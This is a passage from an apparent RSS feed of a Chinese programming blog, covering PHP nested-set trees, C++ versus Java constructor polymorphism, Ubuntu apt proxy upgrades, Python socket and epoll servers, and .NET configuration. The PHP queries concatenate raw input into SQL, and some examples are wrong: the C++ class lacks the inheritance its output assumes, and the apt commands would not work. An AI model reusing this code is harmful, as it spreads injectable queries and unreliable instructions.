>[5]</SPAN> 中保存数组      $path = array();         // 如果 $node 不是根节点，那么继续      if ($row[’parent’]!=”) {          //  $node 的路径的最后一部分是$node父节点的名称          $path[] = $row[’parent’];             // 我们要添加这个节点的父节点的路径到现在这个路径          $path = array_merge(get_path($row[’parent’]), $path);      }         // 返回路径      return $path;  }  ?&gt;</PRE><PRE lang="php" >2</PRE><PRE lang="php" >2.1显示</PRE><PRE lang="php" ><PRE lang="php" >&lt;?php  function display_tree($root) {      // 获得$root节点的左边和右边的值      $result = mysql_query('SELECT lft, rgt FROM tree '.                             'WHERE title="'.$root.'";');      $row = mysql_fetch_array($result);         // 以一个空的$right栈开始      $right = array();         // 现在，获得$root节点的所有后序      $result = mysql_query('SELECT title, lft, rgt FROM tree '.           'WHERE lft BETWEEN '.$row['lft'].' AND '.                             $row['rgt'].' ORDER BY lft ASC;');         // 显示每一行<CODE>    while ($row = mysql_fetch_array($result)) {      // 检查栈里面有没有元素      if (count($right)&gt;0) {        // 检查我们是否需要从栈中删除一个节点        while ($right[count($right)-1]&lt;$row['rgt']) {          array_pop($right);        }      }         // 显示缩进的节点标题      echo str_repeat('  ',count($right)).$row['title']."\n";         // 把这个节点添加到栈中      $right[] = $row['rgt'];    }    }    ?&gt;</CODE></PRE><PRE lang="php" ><CODE>2.2创建结构</CODE></PRE><PRE lang="php" ><CODE><PRE lang="php" >&lt;?php  function rebuild_tree($parent, $left) {      // 这个节点的右值是左值加1      $right = $left+1;         // 获得这个节点的所有子节点      $result = mysql_query('SELECT title FROM tree '.                             'WHERE parent="'.$parent.'";');      while ($row = mysql_fetch_array($result)) {          // 对当前节点的每个子节点递归执行这个函数          // $right 是当前的右值，它会被rebuild_tree函数增加          $right = rebuild_tree($row['title'], $right);      }         // 我们得到了左值，同时现在我们已经处理这个节点我们知道右值的子节点      mysql_query('UPDATE tree SET lft='.$left.', rgt='.                   $right.' WHERE title="'.$parent.'";');         // 返回该节点的右值+1      return $right+1;  }  ?&gt;</PRE></CODE></PRE></PRE></PRE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008451172859/</guid>
    </item>
    <item>
      <title>
<![CDATA[C++与Java的继承区别之一]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720109892556114/</link>
      <description>
<![CDATA[C++的继承体系，要在构造函数完成之后才能生效，因为在构造函数完成之后，虚函数表才能创建，多态性才能实现。<br>因此带来的问题是：在父类构造函数中调用的虚函数，并不能实现多态功能：<br>如下代码所示，在A的构造函数中调用虚函数f，在构造B对象的时候，会自动调用父类A的构造函数，从而调用函数f，根据多态机制，这个f应该指向B对象的f，但是因为这时候对象B还没有构造完成，虚函数表还没有建立，所以多态机制不起作用，调用的是A的函数f。<br>class A{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp; A(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cout&lt;&lt;"A"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f();<br>&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp; virtual void f(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cout&lt;&lt;"A.f"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp;&nbsp; }<br>};<br>class B{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp; B(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cout&lt;&lt;"B"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp; void f(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cout&lt;&lt;"B.f"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp;&nbsp; }<br>};<br>int main(){<br>&nbsp;&nbsp;&nbsp; A a;<br>&nbsp;&nbsp;&nbsp; B b;<br>}<br>输出:<br>A //B()-&gt;A()<br>A.f //B()-&gt;A(){f();}<br>B //B()<br><br>而在Java中，则不存在这个问题，完全是面向对象的思想，即使对象尚未构造完成，多态机制已然启动。<br>class A{<br>&nbsp;&nbsp;&nbsp; public A(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println("A");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; f();<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; public void f(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println("A.f");<br>&nbsp;&nbsp;&nbsp; }<br>}<br>class B extends A{<br>&nbsp;&nbsp;&nbsp; public B(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println("B");<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; public void f(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println("B.f");<br>&nbsp;&nbsp;&nbsp; }<br>}<br>public class Test{<br>&nbsp;&nbsp;&nbsp; public static void main(String args[]){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new B();<br>&nbsp;&nbsp;&nbsp; }<br>}<br>输出:<br>A<br>B.f //多态成功运作，调用子类的f函数<br>B<br><br>自动化测试框架FIT中，Parser的工作全部在构造函数中完成，这样就要求构造函数的功能有很大的要求，在Java的构造函数中可以使用多态的特性，肯定没有问题。而如果在C++的构造函数中，则需要小心翼翼，时刻记着构造函数中多态无效的警戒。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720109892556114/</guid>
    </item>
    <item>
      <title>
<![CDATA[apt使用代理服务器升级Ubuntu到Intrepid]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200810105814674/</link>
      <description>
<![CDATA[1. 修改apt源到intrepid<br>sudo cp /etc/apt/sources.list /etc/apt/sources.list;<br>sudo sed 's/hardy/intrepid/g' /etc/apt/sources.list /etc/apt/sources.list<br>2. 设置代理服务器<br>export http_proxy=http://proxyuser:proxypassword/www.myproxy.com<br>3. 升级<br>sudo apt-get update<br>sudo apt-get dist-upgrade<br>4. 修改grub的kernel配置<br>sudo cp /boot/grub/menu.lst /boot/grub/menu.lst.bak<br>sudo sed 's/24-21/27-7/g' /boot/grub/menu.lst.bak /boot/grub/menu.lst<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200810105814674/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux内核与Nginx]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010719102655283/</link>
      <description>
<![CDATA[C/S模型有很多种结构，分为几个层次，但其基本原理，就是多线程/多进程与多路IO的使用。<br><b>1. 简单层次：</b><br>服务器调用socket的accept进入阻塞，收到客户端请求后进行处理，详细过程参见1-0交互式测试C/S，简单层次的服务器即是单纯的使用以下三种技术之一：<br><b>1.1. 多线程</b><br>每收到一个客户端请求后，都创建一个新线程，然后在新线程里对客户端进行处理，主线程继续等待客户端连接。<br>这个是最常用的模型，基本学习C/S编程都会学到，参见1.1多线程C/S服务端代码。<br><b>1.2. 多进程</b><br>每收到一个客户端请求后，都创建一个新<b>进程</b>，然后在新进程里对客户端进行处理，主进程继续等待客户端连接。<br>这个方式并不常用，因为复制进程的开销太大，而且没有必要，参见1.2多进程C/S服务端代码。但是多进程的思想可以在其它情况下使用，如Apache服务器就用到了多进程。参见2<br><b>1.3. select/poll</b><br>多线程和多进程都提供了很简单的编程模型，但是在客户端请求非常频繁的时候，由线程或进程切换带来的开销就会慢慢成为性能瓶颈。<br><br><b>2. 中级层次</b><br>实际应用中，一般都是对以上三种基本方式进行组合与优化，例如Apache服务器，一般开5个进程，使用select进行多路IO处理。<br><br><b>3. 高级层次epoll</b><br>多路IO是一个很好的思想，问题是基于select与poll的多路方法效率并不高，通过翻阅Linux内核源代码可以知道，每次调用select里，都要先把所有的文件描述符从用户空间拷贝到内核空间，然后在内核空间里遍历每个文件描述符，当文件描述符较多时，这两个过程都会成为性能瓶颈。<br>在Linux2.6内核中，出现了新的处理多路IO的API，epoll，epoll 的机制与select不同，首先调用epoll_ctl将所有文件描述符拷入内核空间，以后每次调用epoll_wait时就不用重复拷贝了，然后在判断就绪的文件描述符时，采用了一个就绪队列，文件描述符就绪时加入就绪队列，每次epoll_wait时只要检查就绪队列就可以了，不用遍历列表。<br>这两个特性使epoll的性能比select有了很大的提高，最新的Nginx即采用epoll机制，市场占有率上升很快，虽然无法替代Apache的地位，但是在很多时候可以取得比Apache好的性能。用户也越来越多。<br>最新版的Python才支持epoll,后面的代码3. epoll的CS服务端代码<br><br><br><b>代码1-0 交互式测试C/S</b><br>Server端：<br>hankjin@jnfdaj:~$ python<br>&gt;&gt;&gt; from socket import *<br>&gt;&gt;&gt; server=socket(AF_INET,SOCK_STREAM,0)<br>&gt;&gt;&gt; server.bind(("0.0.0.0",9999))<br>&gt;&gt;&gt; server.listen(0)<br>&gt;&gt;&gt; client,caddr=server.accept()<br>&gt;&gt;&gt; client.recv(256)<br>'hello, this is hank\r\n'<br>&gt;&gt;&gt; client.send('hi, this is jack')<br>16<br>&gt;&gt;&gt; client.close()<br>Client端<br>hankjin@jnfdaj:~/src/nginx$ telnet localhost 9999<br>Trying 127.0.0.1...<br>Connected to localhost.<br>Escape character is '^]'.<br>hello, this is hank<br>hi, this is jackConnection closed by foreign host.<br><b>代码1.0 1对1C/S服务端代码</b><br>#!/usr/bin/python<br>from socket import *<br>server=socket(AF_INET,SOCK_STREAM,0)<br>server.bind(("0.0.0.0",9999))<br>server.listen(0)<br>client,caddr=server.accept()<br>client.recv(256)<br>client.send('hi, this is jack')<br>client.close()<br><b>代码1.1 多线程C/S服务端代码</b><br>#!/usr/bin/python<br>from socket import *<br>import thread<br>def servClient(sock,addr):<br>&nbsp;&nbsp;&nbsp; print addr<br>&nbsp;&nbsp;&nbsp; sock.recv(256)<br>&nbsp;&nbsp;&nbsp; sock.send('hi, this is from thread')<br>&nbsp;&nbsp;&nbsp; sock.close()<br>server=socket(AF_INET,SOCK_STREAM,0)<br>server.bind(("0.0.0.0",9999))<br>server.listen(0)<br>while True:<br>&nbsp;&nbsp;&nbsp; client,caddr=server.accept()<br>&nbsp;&nbsp;&nbsp; thread.start_new_thread(servClient,(client,caddr,))<br><b>代码1.2 多进程C/S服务端代码</b><br>#!/usr/bin/python<br>from socket import *<br>import thread,os,sys<br>def servClient(sock,addr):<br>&nbsp;&nbsp;&nbsp; print addr<br>&nbsp;&nbsp;&nbsp; sock.recv(256)<br>&nbsp;&nbsp;&nbsp; sock.send('hi, this is from thread')<br>&nbsp;&nbsp;&nbsp; sock.close()<br>&nbsp;&nbsp;&nbsp; print 'over'<br>server=socket(AF_INET,SOCK_STREAM,0)<br>server.bind(("0.0.0.0",9999))<br>server.listen(0)<br>while True:<br>&nbsp;&nbsp;&nbsp; client,caddr=server.accept()<br>&nbsp;&nbsp;&nbsp; if os.fork()==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; servClient(client,caddr)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print 'exited'<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0)<br>&nbsp;&nbsp;&nbsp; client.close()<br><b>代码1.3 select实现的C/S服务端代码</b><br>from socket import *<br>import thread,os,sys,select,time<br>cs=[]<br>def servClients():<br>&nbsp;&nbsp;&nbsp; while True:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if len(cs)==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; time.sleep(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; infds,outfds,errfds=select.select(cs,[],[])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for sock in infds:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock.recv(256)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock.send('hi, this is from thread')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sock.close()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cs.remove(sock)<br>server=socket(AF_INET,SOCK_STREAM,0)<br>server.bind(("0.0.0.0",9998))<br>server.listen(0)<br>thread.start_new_thread(servClients,())<br>while True:<br>&nbsp;&nbsp;&nbsp; client,caddr=server.accept()<br>&nbsp;&nbsp;&nbsp; cs.append(client)<br><b>代码3. epoll 的 CS服务端代码</b><br>#!/usr/bin/python<br>import socket<br>import select<br>msg=r"HTTP/1.0 200 OK\r\nContent-type: text/plain\r\n\r\nHello world!\n"<br>fd=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>fd.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)<br>fd.bind(('0.0.0.0',8805))<br>fd.listen(1024)<br>efd=select.epoll()<br>efd.register(fd.fileno(),select.EPOLLIN|select.EPOLLET)<br>cons={}<br>while True:<br>&nbsp;&nbsp;&nbsp; events=efd.poll(0)<br>&nbsp;&nbsp;&nbsp; for fileno,event in events:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if fileno==fd.fileno():<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while True:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; con,add=fd.accept()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; con.setblocking(0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; efd.register(con.fileno(),select.EPOLLIN|select.EPOLLET)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cons[con.fileno()]=con<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; except:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if event&amp;select.EPOLLIN:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=cons[fileno].recv(512)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; efd.modify(fileno,select.EPOLLOUT|select.EPOLLET)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elif event&amp;select.EPOLLOUT:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cons[fileno].send(msg,len(msg))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cons[fileno].close()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cons[fileno]=None]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010719102655283/</guid>
    </item>
    <item>
      <title>
<![CDATA[.Net的Configuration]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009541021320/</link>
      <description>
<![CDATA[首先ConfigurationSetting.GetConfig("A/B") 寻找configSections的sectionGroup的name属性和Bsection<br>然后根据B的type调用IConfigurationSectionHandler的Create方法，和相应的字段生成ConfigInfo<br><br>1. ConfigurationSettings.GetConfig("IocInCSharp/objects"); <br>2. &nbsp;&nbsp;&nbsp; &lt;configSections&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;sectionGroup name="IocInCSharp"&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;section name="objects" type="IocInCSharp.ConfigHandler, MainApp" /&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/sectionGroup&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/configSections&gt;<br>3. public class ConfigHandler:IConfigurationSectionHandler<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; public object Create(object parent, object configContext, System.Xml.XmlNode section)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ObjectInfo info;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; PropertyInfo propInfo;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ConfigInfo cfgInfo = new ConfigInfo();<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; foreach(XmlNode node in section.ChildNodes)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; info = new ObjectInfo();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; info.name = node.Attributes["name"].Value;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; info.assemblyName = node.Attributes["assembly"].Value;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; info.typeName = node.Attributes["typeName"].Value;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; foreach(XmlNode prop in node)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; propInfo = new PropertyInfo();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; propInfo.propertyName = prop.Attributes["name"].Value;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; propInfo.assemblyName = prop.Attributes["assembly"].Value;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; propInfo.typeName = prop.Attributes["typeName"].Value;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; info.properties.Add(propInfo);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cfgInfo.Objects.Add(info);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return cfgInfo;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>4.&nbsp;&nbsp;&nbsp; &lt;IocInCSharp&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;objects&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;object name="SayHello" assembly="SayHello.dll" typeName="IocInCSharp.SayHello"&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;property name="HelloGenerator" assembly="HelloGenerator.dll" typeName="IocInCSharp.CnHelloGenerator"&gt;&lt;/property&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/object&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/objects&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/IocInCSharp&gt;<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009541021320/</guid>
    </item>
    <item>
      <title>
<![CDATA[寂寞一下bash]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720098285479179/</link>
      <description>
<![CDATA[<span style="font-family: 宋体;">用Bash画个图<br><br>|1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |10&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|11&nbsp;&nbsp;&nbsp;&nbsp; |12&nbsp;&nbsp;&nbsp;&nbsp; |13&nbsp;&nbsp;&nbsp;&nbsp; |14&nbsp;&nbsp;&nbsp;&nbsp; |15&nbsp;&nbsp;&nbsp;&nbsp; |16&nbsp;&nbsp;&nbsp;&nbsp; |17&nbsp;&nbsp;&nbsp;&nbsp; |18&nbsp;&nbsp;&nbsp;&nbsp; |19&nbsp;&nbsp;&nbsp;&nbsp; |20&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|21&nbsp;&nbsp;&nbsp;&nbsp; |22&nbsp;&nbsp;&nbsp;&nbsp; |23&nbsp;&nbsp;&nbsp;&nbsp; |24&nbsp;&nbsp;&nbsp;&nbsp; |25&nbsp;&nbsp;&nbsp;&nbsp; |26&nbsp;&nbsp;&nbsp;&nbsp; |27&nbsp;&nbsp;&nbsp;&nbsp; |28&nbsp;&nbsp;&nbsp;&nbsp; |29&nbsp;&nbsp;&nbsp;&nbsp; |30&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|31&nbsp;&nbsp;&nbsp;&nbsp; |32&nbsp;&nbsp;&nbsp;&nbsp; |33&nbsp;&nbsp;&nbsp;&nbsp; |34&nbsp;&nbsp;&nbsp;&nbsp; |35&nbsp;&nbsp;&nbsp;&nbsp; |36&nbsp;&nbsp;&nbsp;&nbsp; |37&nbsp;&nbsp;&nbsp;&nbsp; |38&nbsp;&nbsp;&nbsp;&nbsp; |39&nbsp;&nbsp;&nbsp;&nbsp; |40&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|41&nbsp;&nbsp;&nbsp;&nbsp; |42&nbsp;&nbsp;&nbsp;&nbsp; |43&nbsp;&nbsp;&nbsp;&nbsp; |44&nbsp;&nbsp;&nbsp;&nbsp; |45&nbsp;&nbsp;&nbsp;&nbsp; |46&nbsp;&nbsp;&nbsp;&nbsp; |47&nbsp;&nbsp;&nbsp;&nbsp; |48&nbsp;&nbsp;&nbsp;&nbsp; |49&nbsp;&nbsp;&nbsp;&nbsp; |50&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|51&nbsp;&nbsp;&nbsp;&nbsp; |52&nbsp;&nbsp;&nbsp;&nbsp; |53&nbsp;&nbsp;&nbsp;&nbsp; |54&nbsp;&nbsp;&nbsp;&nbsp; |55&nbsp;&nbsp;&nbsp;&nbsp; |56&nbsp;&nbsp;&nbsp;&nbsp; |57&nbsp;&nbsp;&nbsp;&nbsp; |58&nbsp;&nbsp;&nbsp;&nbsp; |59&nbsp;&nbsp;&nbsp;&nbsp; |60&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|61&nbsp;&nbsp;&nbsp;&nbsp; |62&nbsp;&nbsp;&nbsp;&nbsp; |63&nbsp;&nbsp;&nbsp;&nbsp; |64&nbsp;&nbsp;&nbsp;&nbsp; |65&nbsp;&nbsp;&nbsp;&nbsp; |66&nbsp;&nbsp;&nbsp;&nbsp; |67&nbsp;&nbsp;&nbsp;&nbsp; |68&nbsp;&nbsp;&nbsp;&nbsp; |69&nbsp;&nbsp;&nbsp;&nbsp; |70&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|71&nbsp;&nbsp;&nbsp;&nbsp; |72&nbsp;&nbsp;&nbsp;&nbsp; |73&nbsp;&nbsp;&nbsp;&nbsp; |74&nbsp;&nbsp;&nbsp;&nbsp; |75&nbsp;&nbsp;&nbsp;&nbsp; |76&nbsp;&nbsp;&nbsp;&nbsp; |77&nbsp;&nbsp;&nbsp;&nbsp; |78&nbsp;&nbsp;&nbsp;&nbsp; |79&nbsp;&nbsp;&nbsp;&nbsp; |80&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 